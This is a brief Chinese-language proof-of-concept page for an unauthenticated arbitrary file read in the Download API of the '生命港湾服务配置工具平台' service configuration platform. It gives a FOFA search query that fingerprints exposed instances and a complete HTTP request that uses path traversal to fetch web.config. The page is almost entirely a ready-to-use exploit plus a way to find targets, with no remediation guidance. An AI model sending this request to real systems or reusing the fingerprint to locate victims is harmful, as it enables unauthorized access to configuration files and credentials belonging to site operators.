# 生命港湾服务配置工具平台Download任意文件读取漏洞

生命港湾服务配置工具平台 Download 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取配置文件等等，导致网站处于极度不安全状态。

## fofa

```javascript
body="css/markdown.css" && body="icon-512.png"
```

## poc

```javascript
GET /api/File/Download?file=../web.config HTTP/1.1
Host: 
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Priority: u=0, i
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept-Encoding: gzip, deflate
Upgrade-Insecure-Requests: 1
```

![image-20241211213908431](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202412112139490.png)